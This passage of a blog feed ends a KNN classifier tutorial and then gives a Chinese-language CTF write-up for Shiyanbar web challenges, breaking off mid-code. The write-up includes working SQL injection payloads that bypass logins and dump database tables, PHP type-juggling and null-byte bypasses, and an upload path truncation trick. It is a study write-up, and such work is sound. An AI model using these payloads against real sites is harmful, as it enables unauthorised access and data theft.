class="line">y = cancerdf[cancerdf.columns[<span class="number">30</span>]]</div><div class="line">X_train,X_test, y_train, y_test = train_test_split(X,y,random_state = <span class="number">0</span>)</div><div class="line"><span class="keyword">return</span> X_train, X_test, y_train, y_test</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">trainKNN</span><span class="params">(feature_data,class_data,k)</span>:</span></div><div class="line">knn = KNeighborsClassifier(n_neighbors=k)</div><div class="line">knn.fit(feature_data,class_data)</div><div class="line"><span class="keyword">return</span> knn</div><div class="line"></div><div class="line">print(<span class="string">"\nThe class distribution is:\n"</span>)</div><div class="line">print(classDistribution(cancerdf))</div><div class="line"></div><div class="line"></div><div class="line">print(<span class="string">"\nUsing train_test_split, split X and y into training and test sets (X_train, X_test, y_train, and y_test).using random_state=0\n"</span>)</div><div class="line"></div><div class="line">X_train, X_test, y_train, y_test = splitDataset(cancerdf)</div><div class="line"></div><div class="line">print(<span class="string">"X_train: "</span> ,X_train.shape)</div><div class="line">print(<span class="string">"X_test: "</span> ,X_test.shape)</div><div class="line">print(<span class="string">"y_train: "</span> ,y_train.shape)</div><div class="line">print(<span class="string">"y_test: "</span>, y_test.shape)</div><div class="line"></div><div class="line"></div><div class="line">print(<span class="string">"Now, training the Knn model: done!\n"</span>)</div><div class="line">knn = trainKNN(X_train,y_train,<span class="number">1</span>)</div><div class="line"></div><div class="line">print(<span class="string">"Predict the class label using the mean value for each feature.\n"</span>)</div><div class="line">print(<span class="string">"The mean value for each feature.\n"</span>)</div><div class="line">means = cancerdf.mean()</div><div class="line">print(means)</div><div class="line">means = means[:<span class="number">-1</span>].values.reshape(<span class="number">1</span>, <span class="number">-1</span>)</div><div class="line">means_predict = knn.predict(means)</div><div class="line">print(<span class="string">"The predict result : "</span>,means_predict)</div><div class="line"></div><div class="line"></div><div class="line">print(<span class="string">"Predict the class labels for the test set X_test"</span>)</div><div class="line">test_predict = knn.predict(X_test)</div><div class="line">print(<span class="string">"The prediction result ：\n"</span>,test_predict)</div><div class="line">print(<span class="string">"The prediction result accuracy : "</span>,knn.score(X_test,y_test))</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;机器学习算法：最近邻(KNN)&lt;br&gt;
    
    </summary>
    
      <category term="机器学习" scheme="http://yoursite.com/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="数据挖掘" scheme="http://yoursite.com/tags/%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98/"/>
    
      <category term="机器学习" scheme="http://yoursite.com/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>实验吧-web-writeup</title>
    <link href="http://yoursite.com/2017/07/24/%E5%AE%9E%E9%AA%8C%E5%90%A7-web-writeup/"/>
    <id>http://yoursite.com/2017/07/24/实验吧-web-writeup/</id>
    <published>2017-07-24T13:27:27.000Z</published>
    <updated>2017-07-28T07:25:37.156Z</updated>
    
    <content type="html"><![CDATA[<p>实验吧-web-writeup（持续更新）<br><a id="more"></a></p>
<h1 id="登陆一下好吗"><a href="#登陆一下好吗" class="headerlink" title="登陆一下好吗"></a>登陆一下好吗</h1><p>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">username=&apos;=&apos; &amp;password=&apos; = &apos;</div></pre></td></tr></table></figure></p>
<p>后端查询语句注入为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">select XXX from XXX where user = &apos; &apos;=&apos; &apos; AND pass = &apos; &apos;=&apos; &apos;</div></pre></td></tr></table></figure></p>
<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ctf&#123;51d1bf8fb65a8c2406513ee8f52283e7&#125;</div></pre></td></tr></table></figure></p>
<h1 id="who-are-you"><a href="#who-are-you" class="headerlink" title="who are you?"></a>who are you?</h1><p>考点：基于时间的盲注，insert注入<br>ip伪装技巧：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">X-Forwarded-For</div><div class="line">Client-IP</div><div class="line">x-remote-IP</div><div class="line">x-originating-IP</div><div class="line">x-remote-addr</div></pre></td></tr></table></figure></p>
<h1 id="因缺思汀的绕过"><a href="#因缺思汀的绕过" class="headerlink" title="因缺思汀的绕过"></a>因缺思汀的绕过</h1><p>查看源代码。注释中有：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">source: source.txt</div></pre></td></tr></table></figure></p>
<p>访问得到源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line"></div><div class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">'uname'</span>]) || !<span class="keyword">isset</span>($_POST[<span class="string">'pwd'</span>])) &#123;</div><div class="line">	<span class="keyword">echo</span> <span class="string">'&lt;form action="" method="post"&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">	<span class="keyword">echo</span> <span class="string">'&lt;input name="uname" type="text"/&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">	<span class="keyword">echo</span> <span class="string">'&lt;input name="pwd" type="text"/&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">	<span class="keyword">echo</span> <span class="string">'&lt;input type="submit" /&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">	<span class="keyword">echo</span> <span class="string">'&lt;/form&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">	<span class="keyword">echo</span> <span class="string">'&lt;!--source: source.txt--&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">    <span class="keyword">die</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">AttackFilter</span><span class="params">($StrKey,$StrValue,$ArrReq)</span></span>&#123;  </div><div class="line">    <span class="keyword">if</span> (is_array($StrValue))&#123;</div><div class="line">        $StrValue=implode($StrValue);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (preg_match(<span class="string">"/"</span>.$ArrReq.<span class="string">"/is"</span>,$StrValue)==<span class="number">1</span>)&#123;   </div><div class="line">        <span class="keyword">print</span> <span class="string">"水可载舟，亦可赛艇！"</span>;</div><div class="line">        <span class="keyword">exit</span>();</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">$filter = <span class="string">"and|select|from|where|union|join|sleep|benchmark|,|\(|\)"</span>;</div><div class="line"><span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $key=&gt;$value)&#123;</div><div class="line">    AttackFilter($key,$value,$filter);</div><div class="line">&#125;</div><div class="line"></div><div class="line">$con = mysql_connect(<span class="string">"XXXXXX"</span>,<span class="string">"XXXXXX"</span>,<span class="string">"XXXXXX"</span>);</div><div class="line"><span class="keyword">if</span> (!$con)&#123;</div><div class="line">	<span class="keyword">die</span>(<span class="string">'Could not connect: '</span> . mysql_error());</div><div class="line">&#125;</div><div class="line">$db=<span class="string">"XXXXXX"</span>;</div><div class="line">mysql_select_db($db, $con);</div><div class="line">$sql=<span class="string">"SELECT * FROM interest WHERE uname = '&#123;$_POST['uname']&#125;'"</span>;</div><div class="line">$query = mysql_query($sql);</div><div class="line"><span class="keyword">if</span> (mysql_num_rows($query) == <span class="number">1</span>) &#123;</div><div class="line">    $key = mysql_fetch_array($query);</div><div class="line">    <span class="keyword">if</span>($key[<span class="string">'pwd'</span>] == $_POST[<span class="string">'pwd'</span>]) &#123;</div><div class="line">        <span class="keyword">print</span> <span class="string">"CTF&#123;XXXXXX&#125;"</span>;</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        <span class="keyword">print</span> <span class="string">"亦可赛艇！"</span>;</div><div class="line">    &#125;</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line">	<span class="keyword">print</span> <span class="string">"一颗赛艇！"</span>;</div><div class="line">&#125;</div><div class="line">mysql_close($con);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>用到mysql中的<code>with rollup</code>技巧。用普通的select查询下；<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">mysql&gt; SELECT uname,pass FROM test.table;</div><div class="line">+---------+------+</div><div class="line">| uname   | pass |</div><div class="line">+---------+------+</div><div class="line">| chybeta | 123  |</div><div class="line">+---------+------+</div><div class="line">1 row in set (0.00 sec)</div></pre></td></tr></table></figure></p>
<p>在加上<code>group by pass with rollup</code>后<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">mysql&gt; SELECT uname,pass FROM test.table group by pass with rollup;</div><div class="line">+---------+------+</div><div class="line">| uname   | pass |</div><div class="line">+---------+------+</div><div class="line">| chybeta | 123  |</div><div class="line">| chybeta | NULL |</div><div class="line">+---------+------+</div><div class="line">2 rows in set (0.01 sec)</div></pre></td></tr></table></figure></p>
<p>rollup在查询结果中加上了一行，并且pass字段的值为NULL。这样当我们post进的pwd的值为空，就能满足<code>$key[&#39;pwd&#39;] == $_POST[&#39;pwd&#39;]</code>的条件了。</p>
<p>在此之前我们还有一个条件要满足<code>mysql_num_rows($query) == 1</code>，我们要选择pass为NULL的单独的这一条记录。从源码分析可得，过滤了逗号，我们不能简单的使用<code>limit 1,1</code>这样的语法，而是可以使用<code>limit 1 offset 1</code>。就本地环境而言，比如</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">mysql&gt; SELECT uname,pass FROM test.table group by pass with rollup limit 1 offset 1;</div><div class="line">+---------+------+</div><div class="line">| uname   | pass |</div><div class="line">+---------+------+</div><div class="line">| chybeta | NULL |</div><div class="line">+---------+------+</div><div class="line">1 row in set (0.01 sec)</div></pre></td></tr></table></figure>
<p>最后构造出的payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uname=&apos;  or 1=1 group by pwd with rollup limit 1 offset 2 #&amp;pwd=</div></pre></td></tr></table></figure></p>
<p>之所以为offset为2，是因为rollup是在查询结果最后加上一行，而我们通过<code>or 1=1</code>查询出来的不知道有多少行，所以这个<code>2</code>是fuzz出来的。</p>
<p>最后flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">CTF&#123;with_rollup_interesting&#125;</div></pre></td></tr></table></figure></p>
<h1 id="简单的sql注入"><a href="#简单的sql注入" class="headerlink" title="简单的sql注入"></a>简单的sql注入</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://ctf5.shiyanbar.com/423/web/</div></pre></td></tr></table></figure>
<h1 id="Once-More"><a href="#Once-More" class="headerlink" title="Once More"></a>Once More</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">if (isset ($_GET[&apos;password&apos;])) &#123;</div><div class="line">	if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&apos;password&apos;]) === FALSE)</div><div class="line">	&#123;</div><div class="line">		echo &apos;&lt;p&gt;You password must be alphanumeric&lt;/p&gt;&apos;;</div><div class="line">	&#125;</div><div class="line">	else if (strlen($_GET[&apos;password&apos;]) &lt; 8 &amp;&amp; $_GET[&apos;password&apos;] &gt; 9999999)</div><div class="line">	&#123;</div><div class="line">		if (strpos ($_GET[&apos;password&apos;], &apos;*-*&apos;) !== FALSE)</div><div class="line">		&#123;</div><div class="line">			die(&apos;Flag: &apos; . $flag);</div><div class="line">		&#125;</div><div class="line">		else</div><div class="line">		&#123;</div><div class="line">			echo(&apos;&lt;p&gt;*-* have not been found&lt;/p&gt;&apos;);</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	else</div><div class="line">	&#123;</div><div class="line">		echo &apos;&lt;p&gt;Invalid password&lt;/p&gt;&apos;;</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>第一层判断通过ereg，要求只能出现字母和数字，但ereg有缺陷，可以用%00绕过。第二层判断要求位数少但要大于9999999，可以利用科学计数法。最里层要求出现<code>*-*</code>，用%00后面再加上即可。<br>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://ctf5.shiyanbar.com/web/more.php</div><div class="line">?password=9e9%00*-*</div></pre></td></tr></table></figure></p>
<p>flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">CTF&#123;Ch3ck_anD_Ch3ck&#125;</div><div class="line">```.</div><div class="line"># Guess Next Session</div></pre></td></tr></table></figure></p>
<p><a href="http://ctf5.shiyanbar.com/web/Session.php" target="_blank" rel="external">http://ctf5.shiyanbar.com/web/Session.php</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">给了源代码</div></pre></td></tr></table></figure></p>
<p>&lt;?php<br>session_start();<br>if (isset ($_GET[‘password’])) {<br>    if ($_GET[‘password’] == $_SESSION[‘password’])<br>        die (‘Flag: ‘.$flag);<br>    else<br>        print ‘</p><p>Wrong guess.</p>‘;<br>}<p></p>
<p>mt_srand((microtime() ^ rand(1, 10000)) % rand(1, 10000) + rand(1, 10000));<br>?&gt;<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">预测是个幌子。session_start()</div><div class="line"></div><div class="line">基于PHPSESSID=oso27id67fqu8hbvq57bacahn3作为身份认证信息，所以我们随便在PHPSESSID中加几个字母，这时服务器端的`$_SESSION[&apos;password&apos;]`为空，然后我们的password再置为空，</div><div class="line"></div><div class="line">![](https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170723/9.jpg?raw=true)</div><div class="line"></div><div class="line">![](https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170723/10.jpg?raw=true)</div><div class="line"></div><div class="line">然后就得到了flag：</div></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># FALSE</div></pre></td></tr></table></figure>
<p><a href="http://ctf5.shiyanbar.com/web/false.php" target="_blank" rel="external">http://ctf5.shiyanbar.com/web/false.php</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">给了源码：</div><div class="line">```php</div><div class="line">&lt;?php</div><div class="line">if (isset($_GET[&apos;name&apos;]) and isset($_GET[&apos;password&apos;])) &#123;</div><div class="line">    if ($_GET[&apos;name&apos;] == $_GET[&apos;password&apos;])</div><div class="line">        echo &apos;&lt;p&gt;Your password can not be your name!&lt;/p&gt;&apos;;</div><div class="line">    else if (sha1($_GET[&apos;name&apos;]) === sha1($_GET[&apos;password&apos;]))</div><div class="line">      die(&apos;Flag: &apos;.$flag);</div><div class="line">    else</div><div class="line">        echo &apos;&lt;p&gt;Invalid password.&lt;/p&gt;&apos;;</div><div class="line">&#125;</div><div class="line">else&#123;</div><div class="line">	echo &apos;&lt;p&gt;Login first!&lt;/p&gt;&apos;;</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p>输入的name和password不能一样，之后的sha1比较用了<code>===</code>，不存在弱类型问题。但sha1不能处理数组，当我们传入<code>name[]=1&amp;password[]=2</code>时，会造成<code>sha1(Array) === sha1(Array)</code>，即<code>NULL===NULL</code>，从而吐出flag。本地测试如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$name = $_GET[&apos;name&apos;];</div><div class="line">var_dump(@sha1($name));</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170723/8.jpg?raw=true" alt=""></p>
<p>payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://ctf5.shiyanbar.com/web/false.php?name[]=1&amp;password[]=2</div></pre></td></tr></table></figure></p>
<h1 id="上传绕过"><a href="#上传绕过" class="headerlink" title="上传绕过"></a>上传绕过</h1><p>上传路径截断。</p>
<ol>
<li>burp抓包，修改为 uploads/cap.php .jpg</li>
<li>转到hex编码，将空格20，改为00</li>
<li>发包。</li>
</ol>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170723/7.jpg?raw=true" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">flag&#123;SimCTF_huachuan&#125;</div></pre></td></tr></table></figure>
<h1 id="程序逻辑问题"><a href="#程序逻辑问题" class="headerlink" title="程序逻辑问题"></a>程序逻辑问题</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://ctf5.shiyanbar.com/web/5/index.php</div></pre></td></tr></table></figure>
<p>访问后查看源代码，有个index.txt。得到源码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">if($_POST[user] &amp;&amp; $_POST[pass]) &#123;</div><div class="line">	$conn = mysql_connect(&quot;********&quot;, &quot;*****&quot;, &quot;********&quot;);</div><div class="line">	mysql_select_db(&quot;phpformysql&quot;) or die(&quot;Could not select database&quot;);</div><div class="line">	if ($conn-&gt;connect_error) &#123;</div><div class="line">		die(&quot;Connection failed: &quot; . mysql_error($conn));</div><div class="line">&#125;</div><div class="line">$user = $_POST[user];</div><div class="line">$pass = md5($_POST[pass]);</div><div class="line"></div><div class="line">$sql = &quot;select pw from php where user=&apos;$user&apos;&quot;;</div><div class="line">$query = mysql_query($sql);</div><div class="line">if (!$query) &#123;</div><div class="line">	printf(&quot;Error: %s\n&quot;, mysql_error($conn));</div><div class="line">	exit();</div><div class="line">&#125;</div><div class="line">$row = mysql_fetch_array($query, MYSQL_ASSOC);</div><div class="line">//echo $row[&quot;pw&quot;];</div><div class="line"></div><div class="line">  if (($row[pw]) &amp;&amp; (!strcasecmp($pass, $row[pw]))) &#123;</div><div class="line">	echo &quot;&lt;p&gt;Logged in! Key:************** &lt;/p&gt;&quot;;</div><div class="line">&#125;</div><div class="line">else &#123;</div><div class="line">    echo(&quot;&lt;p&gt;Log in failure!&lt;/p&gt;&quot;);</div><div class="line"></div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p>对$user没有过滤，尝试报错注入：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">user=&apos;and extractvalue(1, concat(0x5c, (select pw from phpformysql.php limit 1)))#&amp;pass=1</div></pre></td></tr></table></figure></p>
<p>结果很尴尬：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">welcome to simplexue Error: SELECT command denied to user &apos;web6lo&apos;@&apos;localhost&apos; for table &apos;php&apos;</div></pre></td></tr></table></figure></p>
<p>好吧题目既然说是逻辑漏洞，接下来那就找咯。可以看到它的用户名和密码是分开判断的。并且用户名处存在注入。所以思路如下，我们给用户名传入：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">user=&apos; union select &quot;0e830400451993494058024219903391&quot;</div></pre></td></tr></table></figure></p>
<p>构成的sql语句为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">select pw from php where user=&apos; &apos; union select &quot;0e830400451993494058024219903391&quot;</div></pre></td></tr></table></figure></p>
<p>第一个查询结果为空，所以结果返回的是我们传入的<code>0e830400451993494058024219903391</code>，即此时，$row[pw]=0e830400451993494058024219903391。而md5(QNKCDZO)正是该0e字符串值。</p>
<p>最后的payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">user=&apos; union select &quot;0e830400451993494058024219903391&quot;#&amp;pass=QNKCDZO</div></pre></td></tr></table></figure></p>
<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SimCTF&#123;youhaocongming&#125;</div></pre></td></tr></table></figure></p>
<h1 id="what-a-fuck-这是什么鬼东西"><a href="#what-a-fuck-这是什么鬼东西" class="headerlink" title="what a fuck!这是什么鬼东西?"></a>what a fuck!这是什么鬼东西?</h1><p>jsfuck。f12里控制台运行一下，得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Ihatejs</div></pre></td></tr></table></figure></p>
<h1 id="php大法好"><a href="#php大法好" class="headerlink" title="php大法好"></a>php大法好</h1><p>访问<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://ctf5.shiyanbar.com/DUTCTF/index.php</div></pre></td></tr></table></figure></p>
<p>得到提示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Can you authenticate to this website? index.php.txt</div></pre></td></tr></table></figure></p>
<p>访问，得到源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">if</span>(eregi(<span class="string">"hackerDJ"</span>,$_GET[id])) &#123;</div><div class="line">  <span class="keyword">echo</span>(<span class="string">"&lt;p&gt;not allowed!&lt;/p&gt;"</span>);</div><div class="line">  <span class="keyword">exit</span>();</div><div class="line">&#125;</div><div class="line"></div><div class="line">$_GET[id] = urldecode($_GET[id]);</div><div class="line"><span class="keyword">if</span>($_GET[id] == <span class="string">"hackerDJ"</span>)</div><div class="line">&#123;</div><div class="line">  <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Access granted!&lt;/p&gt;"</span>;</div><div class="line">  <span class="keyword">echo</span> <span class="string">"&lt;p&gt;flag: *****************&#125; &lt;/p&gt;"</span>;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div><div class="line"></div><div class="line"></div><div class="line">&lt;br&gt;&lt;br&gt;</div><div class="line">Can you authenticate to this website?</div></pre></td></tr></table></figure></p>
<p>二次解码。payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">payload 1:</div><div class="line">http://ctf5.shiyanbar.com/DUTCTF/index.php?id=%25%36%38%25%36%31%25%36%33%25%36%62%25%36%35%25%37%32%25%34%34%25%34%61</div><div class="line"></div><div class="line">payload 2:</div><div class="line">http://ctf5.shiyanbar.com/DUTCTF/index.php?id=%2568%2561%2563%256b%2565%2572%2544%254a</div></pre></td></tr></table></figure></p>
<p>flag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">DUTCTF&#123;PHP_is_the_best_program_language&#125;</div></pre></td></tr></table></figure></p>
<h1 id="这个看起来有点难"><a href="#这个看起来有点难" class="headerlink" title="这个看起来有点难"></a>这个看起来有点难</h1><p>经过fuzz，可以知道是整数型注入。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://ctf5.shiyanbar.com/8/index.php?id=1 union select 1,database()</div></pre></td></tr></table></figure></p>
<p>得到表名。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://ctf5.shiyanbar.com/8/index.php?id=1 UNION SELECT 1,GROUP_CONCAT(table_name+SEPARATOR+0x3c62723e) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE()</div></pre></td></tr></table></figure></p>
<p>得到列名<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://ctf5.shiyanbar.com/8/index.php?id=1 UNION SELECT 1,GROUP_CONCAT(column_name+SEPARATOR+0x3c62723e) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME=0x746869736b6579</div></pre></td></tr></table></figure></p>
<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://ctf5.shiyanbar.com/8/index.php?id=1 UNION SELECT 1,GROUP_CONCAT(k0y+SEPARATOR+0x3c62723e) FROM thiskey</div></pre></td></tr></table></figure></p>
<p>flag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">whatiMyD91dump</div></pre></td></tr></table></figure></p>
<h1 id="貌似有点难"><a href="#貌似有点难" class="headerlink" title="貌似有点难"></a>貌似有点难</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://ctf5.shiyanbar.com/phpaudit/</div></pre></td></tr></table></figure>
<p>题目提供了源码:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">GetIP</span><span class="params">()</span></span>&#123;</div><div class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_SERVER[<span class="string">"HTTP_CLIENT_IP"</span>]))</div><div class="line">	$cip = $_SERVER[<span class="string">"HTTP_CLIENT_IP"</span>];</div><div class="line"><span class="keyword">else</span> <span class="keyword">if</span>(!<span class="keyword">empty</span>($_SERVER[<span 